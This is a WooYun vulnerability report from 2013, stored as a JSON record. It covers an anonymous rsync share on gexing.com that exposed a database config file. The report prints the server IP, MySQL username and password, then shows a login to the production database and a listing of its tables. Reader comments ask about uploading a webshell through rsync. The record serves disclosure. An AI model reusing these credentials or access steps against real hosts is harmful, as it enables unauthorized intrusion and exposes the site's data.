{"id": 60956, "wybug_id": "wooyun-2013-041277", "wybug_title": "个性网数据分析用数据库配置文件外泄", "wybug_corp": "个性网", "wybug_author": "盈盈无绪", "wybug_date": "2013-10-28 16:26", "wybug_open_date": "2013-12-12 16:27", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-28：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-12-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 配置文件可读到，且mysql用户授权没有限制来源ip. 详细说明：  \nrsync 211.154.219.72::analytics.gexing.com/config/dbconf.php .dbconf.php::::::::::::::<?php$_SERVER['db_conf'] = array(\t\t'gxanalytics' => array(\t\t\t\t 'host' =>'211.154.255.103',\t\t\t\t 'port' =>'3306',\t\t\t\t 'user'=>'gxanalyticsuser',\t\t\t\t 'passwd'=>'woainiya@2012'\t\t\t\t)\t\t);// redis$_SERVER['CONFIG']['redis'] = array(        'master' => array(            'wwwhotsearchcount' => array(                'host' => '211.154.255.103',                'port' => '6379'            )        ));mysql -h211.154.255.103 -ugxanalyticsuser -pwoainiya@2012Welcome to the MySQL monitor.  Commands end with ; or \\g.Your MySQL connection id is 48728435Server version: 5.1.49-3-log (Debian)Copyright (c) 2000, 2011, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.show tables;+------------------------------+| Tables_in_gxanalytics        |+------------------------------+| 3gdayuv                      || 3gpv                         || android7dayuv                || androidactioncount           || androidclienttype            || androiddayuv                 || androiddownloadcount         || androidpv                    || androidvisittype             || attentioncountratio          || contentpublishcount          || emailauthcount               || gexingspecialdaycount        || gexingspecialdaytotal        || goldcountcurrent             || jzbbspostcount               || jzuseractioncount            || moodpublishcount             || newuserregcount              || newzoneusercount             || phpslowcount                 || phpslowdetail                || phpslowdomaincount           || pvtoarea                     || qqbindcount                  || redisdayused                 || redisusedtotal               || smsbusinesslist              || smssendlist                  || specialcodelist              || www500count                  || www500detail                 || wwwactiontalentcount         || wwwattentioncount            || wwwcolumnlistviewcount       || wwwcolumnvisitcount          || wwwdayhouruv                 || wwwdayip                     || wwwdaypv                     || wwwdayuv                     || wwwhotsearchcount            || wwwpublishcount              || wwwspecialpagevisitcount     || wwwuniquechangeinfousercount || wwwuniqueloginusercount      || wwwweekloginusercount        || zoneactiveusercount          || zonemoodusercount            || zoneonlineusercount          || zoneuniqueloginusercount     || zuoyeuniqueloginusercount    || zyactioncount                |+------------------------------+52 rows in set (0.21 sec)\n   漏洞证明：  \nrsync 211.154.219.72::analytics.gexing.com/config/dbconf.php .dbconf.php::::::::::::::<?php$_SERVER['db_conf'] = array(\t\t'gxanalytics' => array(\t\t\t\t 'host' =>'211.154.255.103',\t\t\t\t 'port' =>'3306',\t\t\t\t 'user'=>'gxanalyticsuser',\t\t\t\t 'passwd'=>'woainiya@2012'\t\t\t\t)\t\t);// redis$_SERVER['CONFIG']['redis'] = array(        'master' => array(            'wwwhotsearchcount' => array(                'host' => '211.154.255.103',                'port' => '6379'            )        ));mysql -h211.154.255.103 -ugxanalyticsuser -pwoainiya@2012Welcome to the MySQL monitor.  Commands end with ; or \\g.Your MySQL connection id is 48728435Server version: 5.1.49-3-log (Debian)Copyright (c) 2000, 2011, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.show tables;+------------------------------+| Tables_in_gxanalytics        |+------------------------------+| 3gdayuv                      || 3gpv                         || android7dayuv                || androidactioncount           || androidclienttype            || androiddayuv                 || androiddownloadcount         || androidpv                    || androidvisittype             || attentioncountratio          || contentpublishcount          || emailauthcount               || gexingspecialdaycount        || gexingspecialdaytotal        || goldcountcurrent             || jzbbspostcount               || jzuseractioncount            || moodpublishcount             || newuserregcount              || newzoneusercount             || phpslowcount                 || phpslowdetail                || phpslowdomaincount           || pvtoarea                     || qqbindcount                  || redisdayused                 || redisusedtotal               || smsbusinesslist              || smssendlist                  || specialcodelist              || www500count                  || www500detail                 || wwwactiontalentcount         || wwwattentioncount            || wwwcolumnlistviewcount       || wwwcolumnvisitcount          || wwwdayhouruv                 || wwwdayip                     || wwwdaypv                     || wwwdayuv                     || wwwhotsearchcount            || wwwpublishcount              || wwwspecialpagevisitcount     || wwwuniquechangeinfousercount || wwwuniqueloginusercount      || wwwweekloginusercount        || zoneactiveusercount          || zonemoodusercount            || zoneonlineusercount          || zoneuniqueloginusercount     || zuoyeuniqueloginusercount    || zyactioncount                |+------------------------------+52 rows in set (0.21 sec)\n   修复方案：  授权要严谨   版权声明：转载请注明来源 盈盈无绪@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-05-22 20:23 |    \t\tj2ck3r \t\t\t( 普通白帽子  |\t\t\t        Rank:406 漏洞数:92        | 别关注我，跟你不熟。)\t\t \n  怎么用rsync把马传上去？    \n     2014-05-22 20:28 |    \t\tm_vptr \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:30        | 新手)\t\t \n  这个rsync问题一直没修复...    \n     2014-05-22 21:25 |    \t\tj2ck3r \t\t\t( 普通白帽子  |\t\t\t        Rank:406 漏洞数:92        | 别关注我，跟你不熟。)\t\t \n  @m_vptr 因为没有找到厂商    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}